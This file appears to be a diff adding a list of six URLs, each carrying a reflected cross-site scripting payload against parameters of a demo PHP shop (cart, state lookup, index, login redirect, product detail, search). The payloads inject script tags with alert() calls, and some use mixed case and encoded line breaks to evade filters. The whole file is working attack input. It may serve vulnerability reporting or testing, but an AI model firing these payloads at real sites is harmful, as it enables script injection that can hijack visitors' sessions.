@@ -1,0 +1,6 @@
+http://www.example.com/demo/assets/js/ddcart.php?sid=1&lt;script&gt;alert(649442730777)&lt;/script&gt;
+http://www.example.com/demo/includes/ajax/getstate.php?country=1&amp;prefix=1&gt;&quot;&gt;&lt;ScRiPt %0A%0D&gt;alert(712244301211)%3B&lt;/ScRiPt&gt;
+http://www.example.com/demo/index.php?page=1&amp;search=1&gt;&quot;&gt;&lt;ScRiPt %0A%0D&gt;alert(312759321896)%3B&lt;/ScRiPt&gt;
+http://www.example.com/demo/login.php?redirect=1&gt;&quot;&gt;&lt;ScRiPt %0A%0D&gt;alert(381490124289)%3B&lt;/ScRiPt&gt;
+http://www.example.com/demo/productdetail.php?product=1&gt;&quot;&gt;&lt;ScRiPt %0A%0D&gt;alert(387540356725)%3B&lt;/ScRiPt&gt;
+http://www.example.com/demo/search.php?search=1&lt;script&gt;alert(308229169208)&lt;/script&gt;
